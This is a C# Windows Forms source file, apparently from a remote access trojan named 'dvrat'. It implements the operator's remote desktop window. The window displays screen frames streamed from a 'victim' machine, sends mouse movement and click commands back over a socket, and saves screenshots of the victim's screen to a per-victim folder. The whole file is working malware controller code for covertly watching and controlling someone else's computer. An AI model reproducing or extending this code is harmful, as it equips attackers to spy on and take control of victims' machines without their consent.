using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace dvrat
{
    public partial class RemoteDesktop : Form
    {
        private Size bmsize;
        private Point pp;
        public Socket client;
        public int FPS;
        public Stopwatch sw;
        public bool watch = false;
        public MainForm parent;
        public string user_folder;
        public string victm_name;
        private bool force_close = false;
        public RemoteDesktop()
        {
            InitializeComponent();
        }


        public void SetFrame(byte[] frame)
        {
            try
            {
                new Thread(new ThreadStart(new Action(() =>
                {
                    try
                    {
                        MemoryStream ms;
                        Bitmap bm;
                        ms = new MemoryStream(frame, 0, frame.Length);
                        ms.Write(frame, 0, frame.Length);
                        bm = (Bitmap)Bitmap.FromStream(ms);
                        bmsize = bm.Size;
                        FrameHandler.Invoke(new MethodInvoker(() =>
                        {
                            FrameHandler.Image = bm;
                        }));
                    }
                    catch (Exception ex)
                    {
                        GC.Collect();
                        new MainForm().error_log_file(ex.ToString());
                    }
                }))).Start();
                GC.Collect();

            }
            catch (Exception ex)
            {
                GC.Collect();
                new MainForm().error_log_file(ex.ToString());
            }
        }

        public void UpdateFPS()
        {
            try
            {

                if (watch)
                {
                    if (sw.ElapsedMilliseconds >= 1000)
                    {
                        if (this.FPS < 15)
                        {
                            fps_label.Invoke(new MethodInvoker(() =>
                            {
                                fps_label.ForeColor = Color.Red;
                                fps_label.Text = $"FPS: {this.FPS}";
                            }));

                        }
                        else if (this.FPS > 15)
                        {
                            fps_label.Invoke(new MethodInvoker(() =>
                            {
                                fps_label.ForeColor = Color.Yellow;
                                fps_label.Text = $"FPS: {this.FPS}";
                            }));

                        }
                        else if (this.FPS > 20)
                        {
                            fps_label.Invoke(new MethodInvoker(() =>
                            {
                                fps_label.ForeColor = Color.Green;
                                fps_label.Text = $"FPS: {this.FPS}";
                            }));


                        }
                        watch = false;
                        FPS = 0;
                    }
                }


            }
            catch (Exception)
            {
            }
        }

        private void RemoteDesktop_Load(object sender, EventArgs e)
        {
            this.Text = $"Remote Desktop [{this.victm_name}]";
            title_label.Text = $"Remote Desktop [{this.victm_name}]";
        }

        private void FrameHandler_MouseMove(object sender, MouseEventArgs e)
        {
            if (this.mouse_checkBox.Checked)
            {
                int X = (int)((float)e.X * (float)((float)bmsize.Width / (float)FrameHandler.Width));
                int Y = (int)((float)e.Y * (float)((float)bmsize.Height / (float)FrameHandler.Height));
                client.Send(Encoding.Default.GetBytes($"rdp_mm;\n{X}\n{Y}"));

                //label1.Text = $"X = {PP.X} | Y = {PP.Y} | img.Width = {bm.Width} | img.Height = {bm.Height} | pictureBox1.Width = {pictureBox1.Width} | pictureBox1.Height = {pictureBox1.Height} | e.X = {e.X } | e.Y = {e.Y}";
                GC.Collect();

            }
        }

        private void RemoteDesktop_FormClosing(object sender, FormClosingEventArgs e)
        {

            this.parent.send_to_client(this.client, "rdpend;");

        }

        private void RemoteDesktop_FormClosed(object sender, FormClosedEventArgs e)
        {

            this.parent.send_to_client(this.client, "rdpend;");

        }

        private void Screenshot_button_Click(object sender, EventArgs e)
        {
            string screenshot_folder = $"{user_folder}\\ScreenShot";
            if (!Directory.Exists(screenshot_folder))
            {
                Directory.CreateDirectory(screenshot_folder);
            }
            string timestamp = DateTime.UtcNow.ToString("yyyyMMddHHmmssfff",
                                                     CultureInfo.InvariantCulture);
            FrameHandler.Image.Save($"{screenshot_folder}\\{timestamp}.png", ImageFormat.Png);
        }

        private void FrameHandler_Click(object sender, EventArgs e)
        {

        }

        private void FrameHandler_MouseDown(object sender, MouseEventArgs e)
        {

            new Thread(new ThreadStart(() => {

                if (this.mouse_checkBox.Checked)
                {
                    int X = (int)((float)e.X * (float)((float)bmsize.Width / (float)FrameHandler.Width));
                    int Y = (int)((float)e.Y * (float)((float)bmsize.Height / (float)FrameHandler.Height));
                    if (e.Button == MouseButtons.Left)
                    {
                        this.parent.send_to_client(this.client, $"rdp_pl;\n{X}\n{Y}");
                    }
                    else if (e.Button == MouseButtons.Right)
                    {
                        this.parent.send_to_client(this.client, $"rdp_pr;\n{X}\n{Y}");


                    }
                    //label1.Text = $"X = {PP.X} | Y = {PP.Y} | img.Width = {bm.Width} | img.Height = {bm.Height} | pictureBox1.Width = {pictureBox1.Width} | pictureBox1.Height = {pictureBox1.Height} | e.X = {e.X } | e.Y = {e.Y}";
                    GC.Collect();

                }
                Thread.Sleep(500);

            })).Start();
        

        }

        private void FrameHandler_MouseUp(object sender, MouseEventArgs e)
        {
            new Thread(new ThreadStart(()=> {

                if (this.mouse_checkBox.Checked)
                {
                    int X = (int)((float)e.X * (float)((float)bmsize.Width / (float)FrameHandler.Width));
                    int Y = (int)((float)e.Y * (float)((float)bmsize.Height / (float)FrameHandler.Height));
                    if (e.Button == MouseButtons.Left)
                    {
                            this.parent.send_to_client(this.client, $"rdp_rl;\n{X}\n{Y}");
                            Thread.Sleep(50);

                    }
                    else if (e.Button == MouseButtons.Right)
                    {
                            this.parent.send_to_client(this.client, $"rdp_rr;\n{X}\n{Y}");
                            Thread.Sleep(50);

                    }
                    //label1.Text = $"X = {PP.X} | Y = {PP.Y} | img.Width = {bm.Width} | img.Height = {bm.Height} | pictureBox1.Width = {pictureBox1.Width} | pictureBox1.Height = {pictureBox1.Height} | e.X = {e.X } | e.Y = {e.Y}";
                    GC.Collect();
                    Thread.Sleep(400);
                }

            })).Start();
           
        }

        private void close_label_Click(object sender, EventArgs e)
        {
            if (!force_close)
            {
                new Thread(new ThreadStart(() =>
                {
                    Invoke(new MethodInvoker(() =>
                    {
                        title_label.Text = "Wait to client conform close...";
                    }));

                })).Start();
                new Thread(new ThreadStart(() =>
                {
                    for (int i = 0; i != 5; ++i) {
                        this.parent.send_to_client(this.client, "rdpend;");
                        Thread.Sleep(250);
                    }

                })).Start();
                force_close = true;
            }
            else
            {
                if (MessageBox.Show("Do you wanna force close ?", "Yes, No!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                {
                    this.parent.send_to_client(this.client, "rdpend;");
                    this.Close();
                }
            }

        }
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();
        private void handle_label_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void handle_label_Click(object sender, EventArgs e)
        {

        }
    }
}
